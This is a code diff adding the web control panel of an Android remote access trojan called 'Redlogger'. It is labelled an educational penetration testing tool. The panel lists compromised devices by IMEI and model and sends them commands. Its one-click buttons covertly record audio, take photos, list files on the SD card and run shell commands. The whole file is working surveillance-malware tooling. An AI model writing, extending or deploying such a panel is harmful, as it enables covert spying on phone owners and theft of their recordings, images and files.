@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redlogger Controller</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #1a1a1a;
+            color: #ffffff;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #ff4444;
+            margin: 0;
+        }
+        .header p {
+            color: #cccccc;
+            margin: 5px 0;
+        }
+        .section {
+            background-color: #2a2a2a;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .section h2 {
+            color: #ff4444;
+            margin-top: 0;
+        }
+        .device-card {
+            background-color: #333333;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 4px solid #ff4444;
+        }
+        .device-card h3 {
+            margin: 0 0 10px 0;
+            color: #ffffff;
+        }
+        .device-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .info-item {
+            background-color: #444444;
+            padding: 8px;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+        .info-label {
+            font-weight: bold;
+            color: #ff4444;
+        }
+        .status-active {
+            color: #44ff44;
+        }
+        .status-inactive {
+            color: #ffaa44;
+        }
+        .command-section {
+            margin-top: 15px;
+        }
+        .command-input {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .command-input input {
+            flex: 1;
+            padding: 8px;
+            background-color: #444444;
+            border: 1px solid #666666;
+            border-radius: 3px;
+            color: #ffffff;
+        }
+        .command-input button {
+            padding: 8px 15px;
+            background-color: #ff4444;
+            color: #ffffff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .command-input button:hover {
+            background-color: #ff6666;
+        }
+        .quick-commands {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .quick-cmd {
+            padding: 5px 10px;
+            background-color: #555555;
+            color: #ffffff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .quick-cmd:hover {
+            background-color: #666666;
+        }
+        .logs-section {
+            max-height: 300px;
+            overflow-y: auto;
+            background-color: #1a1a1a;
+            padding: 10px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 2px solid #666666;
+            padding-left: 10px;
+        }
+        .log-timestamp {
+            color: #888888;
+        }
+        .log-type {
+            color: #ffaa44;
+            font-weight: bold;
+        }
+        .refresh-btn {
+            background-color: #4444ff;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .refresh-btn:hover {
+            background-color: #6666ff;
+        }
+        .no-devices {
+            text-align: center;
+            color: #888888;
+            padding: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔴 Redlogger Controller</h1>
+            <p>Android RAT Management Interface</p>
+            <p>Educational Penetration Testing Tool</p>
+        </div>
+
+        <button class="refresh-btn" onclick="loadDevices()">🔄 Refresh Devices</button>
+
+        <div class="section">
+            <h2>📱 Connected Devices</h2>
+            <div id="devices-container">
+                <div class="no-devices">Loading devices...</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📋 System Logs</h2>
+            <div class="logs-section" id="system-logs">
+                <div class="log-entry">
+                    <span class="log-timestamp">[2024-01-01 00:00:00]</span>
+                    <span class="log-type">INFO</span>
+                    Redlogger Controller started
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let devices = [];
+
+        async function loadDevices() {
+            try {
+                const response = await fetch('/api/devices');
+                const data = await response.json();
+                devices = data.devices || [];
+                renderDevices();
+            } catch (error) {
+                console.error('Error loading devices:', error);
+                document.getElementById('devices-container').innerHTML = 
+                    '<div class="no-devices">Error loading devices</div>';
+            }
+        }
+
+        function renderDevices() {
+            const container = document.getElementById('devices-container');
+            
+            if (devices.length === 0) {
+                container.innerHTML = '<div class="no-devices">No devices connected</div>';
+                return;
+            }
+
+            container.innerHTML = devices.map(device => `
+                <div class="device-card">
+                    <h3>${device.manufacturer} ${device.model}</h3>
+                    <div class="device-info">
+                        <div class="info-item">
+                            <span class="info-label">Device ID:</span> ${device.device_id}
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">IMEI:</span> ${device.imei}
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Android:</span> ${device.android_version}
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Status:</span> 
+                            <span class="status-${device.status}">${device.status}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Last Seen:</span> ${device.last_seen}
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">First Seen:</span> ${device.first_seen}
+                        </div>
+                    </div>
+                    
+                    <div class="command-section">
+                        <div class="command-input">
+                            <input type="text" id="cmd-${device.device_id}" placeholder="Enter command..." />
+                            <button onclick="sendCommand('${device.device_id}')">Send</button>
+                        </div>
+                        <div class="quick-commands">
+                            <button class="quick-cmd" onclick="quickCommand('${device.device_id}', 'audio:5')">🎤 Record Audio (5s)</button>
+                            <button class="quick-cmd" onclick="quickCommand('${device.device_id}', 'photo')">📷 Take Photo</button>
+                            <button class="quick-cmd" onclick="quickCommand('${device.device_id}', 'files:/sdcard')">📁 List Files</button>
+                            <button class="quick-cmd" onclick="quickCommand('${device.device_id}', 'shell:whoami')">👤 Whoami</button>
+                            <button class="quick-cmd" onclick="quickCommand('${device.device_id}', 'shell:ps')">⚙️ Processes</button>
+                            <button class="quick-cmd" onclick="quickCommand('${device.device_id}', 'shell:netstat -an')">🌐 Network</button>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function sendCommand(deviceId) {
+            const input = document.getElementById(`cmd-${deviceId}`);
+            const command = input.value.trim();
+            
+            if (!command) return;
+
+            try {
+                const response = await fetch('/api/commands', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        command: command
+                    })
+                });
+
+                if (response.ok) {
+                    input.value = '';
+                    addLog(`Command sent to ${deviceId}: ${command}`);
+                } else {
+                    addLog(`Error sending command to ${deviceId}`);
+                }
+            } catch (error) {
+                console.error('Error sending command:', error);
+                addLog(`Error sending command to ${deviceId}`);
+            }
+        }
+
+        async function quickCommand(deviceId, command) {
+            try {
+                const response = await fetch('/api/commands', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        command: command
+                    })
+                });
+
+                if (response.ok) {
+                    addLog(`Quick command sent to ${deviceId}: ${command}`);
+                } else {
+                    addLog(`Error sending quick command to ${deviceId}`);
+                }
+            } catch (error) {
+                console.error('Error sending quick command:', error);
+                addLog(`Error sending quick command to ${deviceId}`);
+            }
+        }
+
+        function addLog(message) {
+            const logsContainer = document.getElementById('system-logs');
+            const timestamp = new Date().toISOString().replace('T', ' ').substr(0, 19);
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `
+                <span class="log-timestamp">[${timestamp}]</span>
+                <span class="log-type">INFO</span>
+                ${message}
+            `;
+            logsContainer.insertBefore(logEntry, logsContainer.firstChild);
+            
+            // Keep only last 50 log entries
+            while (logsContainer.children.length > 50) {
+                logsContainer.removeChild(logsContainer.lastChild);
+            }
+        }
+
+        // Handle Enter key in command inputs
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter' && event.target.id.startsWith('cmd-')) {
+                const deviceId = event.target.id.replace('cmd-', '');
+                sendCommand(deviceId);
+            }
+        });
+
+        // Load devices on page load
+        loadDevices();
+
+        // Auto-refresh devices every 30 seconds
+        setInterval(loadDevices, 30000);
+    </script>
+</body>
+</html>
+
